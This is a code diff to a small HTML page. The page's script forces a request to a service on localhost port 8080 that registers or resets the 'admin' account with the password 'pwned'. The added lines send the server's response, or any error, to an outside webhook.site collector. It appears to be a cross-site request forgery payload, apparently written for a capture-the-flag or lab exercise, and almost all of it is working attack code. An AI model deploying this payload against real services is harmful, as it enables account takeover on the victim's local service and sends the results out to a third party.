@@ -2,12 +2,19 @@
 <html>
 <body>
   <script>
+    // First, try to reset the password.
     fetch('http://127.0.0.1:8080/register', {
         method: 'POST',
-        headers: {
-            'X-Username': 'admin',
-            'X-Password': 'pwned'
-        }
+        headers: { 'X-Username': 'admin', 'X-Password': 'pwned' }
+    })
+    .then(response => response.text()) // Get the response from the server as text
+    .then(responseText => {
+        // SUCCESS: Send the server's response to your webhook
+        fetch('https://webhook.site/7a826837-0f6f-4fe9-aea1-2110f03f11ed?status=success&data=' + encodeURIComponent(responseText));
+    })
+    .catch(error => {
+        // ERROR: Send the error message to your webhook
+        fetch('https://webhook.site/7a826837-0f6f-4fe9-aea1-2110f03f11ed?status=error&data=' + encodeURIComponent(error.toString()));
     });
   </script>
 </body>
